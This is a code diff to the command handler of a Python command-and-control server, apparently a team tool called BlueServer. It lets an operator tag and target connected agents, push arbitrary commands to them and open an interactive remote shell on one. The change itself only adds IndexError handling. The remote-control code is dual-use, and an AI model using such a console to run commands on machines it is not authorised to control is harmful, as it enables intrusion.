@@ -36,107 +36,110 @@ class BlueServer:
         logging.basicConfig(filename=logfilename, encoding='utf-8', level=logging.DEBUG)
 
     def handle_command(self,userin):
-        splits = userin.split(" ") #splits userinput on each space
-        if userin.upper() in ["QUIT","EXIT","Q"]:
-            validate = input("Confirmation required: are you sure you want to quit? (y/n)\n")
-            if validate.upper() in ["YES","Y"]:
-                for conn in self.connections: #Kills all connections before terminating program
-                    conn.sock.shutdown(socket.SHUT_RDWR)
-                    conn.sock.close()
-                self.stop()
-            else:
-                print("Cancelling QUIT command")
-        elif userin.upper() == "HELP" or userin == "?":
-            bluec2utils.help()
-        elif splits[0].upper() == "SET":
-            #Handles setting information
-            if splits[1].upper() == "HELP":
-                bluec2utils.help("set")
-            elif splits[1].upper() == "TARGETS":
-                self.targets = []
-                if splits[2].upper() == "TAGGED":
-                    tag = splits[3]
-                    for conn in self.connections:
-                        if tag in conn.tags:
-                            self.targets.append(conn)
+        try:
+            splits = userin.split(" ") #splits userinput on each space
+            if userin.upper() in ["QUIT","EXIT","Q"]:
+                validate = input("Confirmation required: are you sure you want to quit? (y/n)\n")
+                if validate.upper() in ["YES","Y"]:
+                    for conn in self.connections: #Kills all connections before terminating program
+                        conn.sock.shutdown(socket.SHUT_RDWR)
+                        conn.sock.close()
+                    self.stop()
                 else:
-                    targets = splits[2].split(",")
-                    for target in targets:
-                        match = re.match(IP_REGEX,target)
-                        if target in self.targets:
-                            continue
-                        elif match:
-                            self.targets.append(self.ip_to_agent(target))
-                        elif self.agentnum_to_agent(target) != None:
-                            self.targets.append(self.agentnum_to_agent(target))
-                        else:
-                            print(target + " not a found connection")
-            else:
-                print("Invalid command, use SET HELP to see valid paramaters for SET")
-        elif splits[0].upper() == "CMD":
-            cmd = ' '.join(splits[1:])
-            cmd = cmd.strip()
-            for target in self.targets:
-                if target.is_locked():
-                    while target.is_locked():
-                        time.sleep(1)
-                target.lock()
-                self.send_cmd(cmd,target)
-                target.unlock()
-        elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
-            for conn in self.connections:
-                if conn.sock == None:
-                    self.connections.remove(conn)
-                    continue
-                if conn != self.connections[-1]:
-                    print(str(conn),end=",")
+                    print("Cancelling QUIT command")
+            elif userin.upper() == "HELP" or userin == "?":
+                bluec2utils.help()
+            elif splits[0].upper() == "SET":
+                #Handles setting information
+                if splits[1].upper() == "HELP":
+                    bluec2utils.help("set")
+                elif splits[1].upper() == "TARGETS":
+                    self.targets = []
+                    if splits[2].upper() == "TAGGED":
+                        tag = splits[3]
+                        for conn in self.connections:
+                            if tag in conn.tags:
+                                self.targets.append(conn)
+                    else:
+                        targets = splits[2].split(",")
+                        for target in targets:
+                            match = re.match(IP_REGEX,target)
+                            if target in self.targets:
+                                continue
+                            elif match:
+                                self.targets.append(self.ip_to_agent(target))
+                            elif self.agentnum_to_agent(target) != None:
+                                self.targets.append(self.agentnum_to_agent(target))
+                            else:
+                                print(target + " not a found connection")
                 else:
-                    print(str(conn))
-        elif userin.upper() == "SHOW TARGETS":
-            for target in self.targets:
-                if target.sock == None:
-                    self.targets.remove(target)
-                    continue
-                if target != self.targets[-1]:
-                    print(str(target),end=",")
+                    print("Invalid command, use SET HELP to see valid paramaters for SET")
+            elif splits[0].upper() == "CMD":
+                cmd = ' '.join(splits[1:])
+                cmd = cmd.strip()
+                for target in self.targets:
+                    if target.is_locked():
+                        while target.is_locked():
+                            time.sleep(1)
+                    target.lock()
+                    self.send_cmd(cmd,target)
+                    target.unlock()
+            elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
+                for conn in self.connections:
+                    if conn.sock == None:
+                        self.connections.remove(conn)
+                        continue
+                    if conn != self.connections[-1]:
+                        print(str(conn),end=",")
+                    else:
+                        print(str(conn))
+            elif userin.upper() == "SHOW TARGETS":
+                for target in self.targets:
+                    if target.sock == None:
+                        self.targets.remove(target)
+                        continue
+                    if target != self.targets[-1]:
+                        print(str(target),end=",")
+                    else:
+                        print(str(target))
+            elif splits[0].upper() == "SHOW" and splits[1].upper() == "TAGGED":
+                tag = splits[2]
+                for conn in self.connections:
+                    if tag in conn.tags:
+                        print(str(conn))
+            elif splits[0].upper() == "KILL":
+                agents = splits[1].split(",")
+                for a in agents:
+                    agent = self.agentnum_to_agent(a)
+                    self.disconnect_agent(agent)
+            elif splits[0].upper() == "SHELL":
+                agent = self.agentnum_to_agent(splits[1])
+                if agent != None:
+                    shell_in = ""
+                    while shell_in not in ["quit", "exit","logout"]:
+                        shell_in = input("$ ")
+                        if shell_in in ["quit", "exit","logout"]:
+                            break
+                        splits = shell_in.split()
+                        cmd = shell_in.strip()
+                        self.send_cmd(cmd,agent)
                 else:
-                    print(str(target))
-        elif splits[0].upper() == "SHOW" and splits[1].upper() == "TAGGED":
-            tag = splits[2]
-            for conn in self.connections:
-                if tag in conn.tags:
-                    print(str(conn))
-        elif splits[0].upper() == "KILL":
-            agents = splits[1].split(",")
-            for a in agents:
-                agent = self.agentnum_to_agent(a)
-                self.disconnect_agent(agent)
-        elif splits[0].upper() == "SHELL":
-            agent = self.agentnum_to_agent(splits[1])
-            if agent != None:
-                shell_in = ""
-                while shell_in not in ["quit", "exit","logout"]:
-                    shell_in = input("$ ")
-                    if shell_in in ["quit", "exit","logout"]:
-                        break
-                    splits = shell_in.split()
-                    cmd = shell_in.strip()
-                    self.send_cmd(cmd,agent)
+                    print("Invalid Agent")
+            elif splits[0].upper() + " " + splits[1].upper() == "APPLY TEMPLATE":
+                if splits[2].upper() == "IP":
+                    self.apply_template("ip")
+            elif splits[0].upper() + " " + splits[1].upper() == "SHOW TAGS":
+                agent = self.agentnum_to_agent(int(splits[2]))
+                agent.display_tags()
+            elif splits[0].upper() == "TAG":
+                agent = self.agentnum_to_agent(int(splits[1]))
+                tag = splits[2]
+                if tag not in agent.tags:
+                    agent.tags.append(tag)
             else:
-                print("Invalid Agent")
-        elif splits[0].upper() + " " + splits[1].upper() == "APPLY TEMPLATE":
-            if splits[2].upper() == "IP":
-                self.apply_template("ip")
-        elif splits[0].upper() + " " + splits[1].upper() == "SHOW TAGS":
-            agent = self.agentnum_to_agent(int(splits[2]))
-            agent.display_tags()
-        elif splits[0].upper() == "TAG":
-            agent = self.agentnum_to_agent(int(splits[1]))
-            tag = splits[2]
-            if tag not in agent.tags:
-                agent.tags.append(tag)
-        else:
-            print("Command does not exist\n")
+                print("Command does not exist\n")
+        except IndexError:
+            print("Index Error")
 
     def send_cmd(self, cmd, agent):
         cmd = "cmd|" + cmd
